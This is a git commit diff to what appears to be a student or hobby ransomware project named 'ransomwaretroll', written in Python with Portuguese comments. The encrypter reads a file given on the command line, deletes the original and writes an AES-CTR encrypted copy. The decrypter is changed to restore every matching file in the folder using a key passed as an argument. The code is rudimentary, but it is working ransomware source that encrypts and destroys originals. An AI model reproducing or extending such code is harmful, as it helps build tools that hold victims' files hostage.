928dfea4af0730a4f92870b01e58a4db3b50cb5c
Thiago da Cunha <thiago.cunha20@outlook.com>
2024-12-30 10:43:47 -0300

    add paramentros do cmd

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,23 @@
 import os
 import pyaes
+import sys
+import glob
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+folder_path = './'
+encrypt_file_name_flag = '.ransomwaretroll'
+matching_files = glob.glob(os.path.join(folder_path, '*'+encrypt_file_name_flag+'*')) 
 
-## chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
+for file_name in matching_files:
+    file = open(file_name, "rb")
+    file_data = file.read()
+    file.close()
 
-## remover o arquivo criptografado
-os.remove(file_name)
+    key = bytes(sys.argv[1], 'utf-8')
+    aes = pyaes.AESModeOfOperationCTR(key)
+    decrypt_data = aes.decrypt(file_data)
+    os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
+    new_file = file_name.split(encrypt_file_name_flag)[0]
+    new_file = open(f'{new_file}', "wb")
+    new_file.write(decrypt_data)
+    new_file.close()
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,22 @@
 import os
 import pyaes
+import sys
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
+file_name = sys.argv[1]
+encrypt_key = sys.argv[2]
+encrypt_file_name_flag = '.ransomwaretroll'
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
 os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
+key = bytes(encrypt_key, 'utf-8')
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+new_file = file_name + encrypt_file_name_flag
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
